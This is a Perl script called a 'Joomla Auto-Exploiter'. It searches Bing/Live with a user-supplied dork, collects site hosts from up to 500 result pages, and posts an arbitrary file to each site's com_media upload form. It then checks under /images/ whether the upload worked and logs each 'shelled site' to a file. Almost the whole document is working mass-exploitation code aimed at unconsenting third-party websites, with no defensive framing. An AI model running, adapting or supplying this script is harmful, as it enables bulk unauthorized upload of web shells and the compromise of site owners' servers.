use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
use URI;
use HTTP::Request::Common;
$|++;
print "Please note that this exploit script is in beta.\n";
print "Which means it can happen that we get false positive of an file upload.\n";
print "\n\n";
print "[i] Recomnmended Dork: index.php?option=com_media \n";
print "please input your dork : ";
chomp ($kiddies=<STDIN>);
print "\n";
print "Name file and path of the file to upload(.txt or .jpg) : ";
chomp ($file=<STDIN>);
print "\n";
print "Name file and path of the file to save shelled site : ";
chomp ($filename=<STDIN>);
print "\n";
print "\n\n";


if ($kiddies=~ /(.*)/){

    print "+===============================+\n";
    print "| Searching, please wait...     |\n";
    print "| Search via Dorl               |\n";
    print "| Joomla Auto-Exploiter         |\n";
    print "| Ctrl + C to abort operation   |\n";
    print "+===============================+\n\n";

my $flyff666=$1;

# Starting The Search Engine
my @mlist=&ugds($flyff666);

sub ugds(){

my @lst;
for($spykit=1;$spykit<=500;$spykit+=1){

#------------------------------------------

my $wisdom=LWP::UserAgent->new;
$wisdom->agent("");

#------------------------------------------
my $google=("http://search.live.com/results.aspx?q=".$flyff666."&first=".$spykit."&FORM=PERE");
my $g0nzhack=$wisdom->get("$google");
$g0nzhack->as_string;
my $Res=$g0nzhack->content;
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)/g){
if($1 !~ /msn|live|microsoft|WindowsLiveTranslator|youtube|google|cache|74.125.153.132|inurl:|q=|404|403|Time|out|Network|Failed/){

    my $gunslinger=$1;
    $gunslinger=~s/&(.*)/\ /g;
    my $url = URI->new( "http://$gunslinger" );
    my $domain = $url->host;
    print "Site found: http://$gunslinger\n";
    print "++++++ [ Exploiting ] ++++++\n";
    chomp($_);
    $webs = $_;
	$webs = "http://$domain";
    $zeeb = $webs."/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
 
    print "\n\n [+] Scanning -> $webs";
 
    $ua = LWP::UserAgent->new;
    $ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
    $fucki = $ua->get($zeeb);
    $kzz = $fucki->content;
    if($kzz =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $kzz =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
    {
       print "\n [+] Try Upload >> $webs"; sleep(1);
 
    $url = $1;
    $url =~ s/&amp;/&/gi;
 
    } else { print "\n [-] com_media not found -> $webs"; sleep(1); }
 
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$file] ]);
 
    $shell = $webs."/images/".$file;
 
    $check = $ua->get($shell);
    if($check->content =~/by/ || $check->is_success ) {
 
           print "\n [+] File Uploaded >> $shell --> Saved At $filename\n";
 
    open(save ,">>$filename");
    print save "File Uploaded: $shell\n";
    close save;
     
} else {  print  "\n [-] File Upload Fail\n ";   }
 
}}
}}
}